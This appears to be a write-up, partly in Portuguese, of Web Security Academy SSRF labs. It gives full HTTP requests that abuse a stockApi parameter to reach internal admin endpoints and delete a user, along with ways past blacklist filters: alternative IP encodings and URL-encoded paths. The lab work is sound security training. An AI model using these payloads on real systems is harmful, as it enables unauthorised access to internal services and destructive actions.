Original request:

<pre>
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=<b>http://192.168.0.68/admin</b>
</pre>

1. Utilize o Intruder para fazer brute-force no escopo do IP apresentado. (192.168.0.0/24)
2. Encontre o host que tenha uma resposta **200**.
3. Delete a conta **carlos**.

Modified request:

<pre>
POST /product/stock HTTP/1.1
Host: ac651f621f1a3dbf80711543008b00f0.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ac651f621f1a3dbf80711543008b00f0.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Origin: https://ac651f621f1a3dbf80711543008b00f0.web-security-academy.net
Content-Length: 63
Connection: close
Cookie: session=yFkvTJbphy0CMHlIcToEFFcRsLK4kFG7

stockApi=<b>http://192.168.0.245:8080/admin/delete?username=carlos</b>
</pre>

# Bypass defenses

### Blacklist-based input filters

Some applications block input containing hostnames like 127.0.0.1 and localhost, or sensitive URLs like /admin. In this situation, you can often circumvent the filter using various techniques:

- Using an alternative IP representation of 127.0.0.1, such as 2130706433, 017700000001, or 127.1.
- Registering your own domain name that resolves to 127.0.0.1. You can use spoofed.burpcollaborator.net for this purpose.
- Obfuscating blocked strings using URL encoding or case variation.

Request bypassing:

<pre>
POST /product/stock HTTP/1.1
Host: acfe1ff11f45e9578076891e00fa005a.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://acfe1ff11f45e9578076891e00fa005a.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Origin: https://acfe1ff11f45e9578076891e00fa005a.web-security-academy.net
Content-Length: 67
Connection: close
Cookie: session=g1L621qZGsDr5z5CA9vHuWtMZkmTUe7V

stockApi=<b>http://2130706433%2f%41%64%4d%69%4e/delete?username=carlos</b>
</pre>

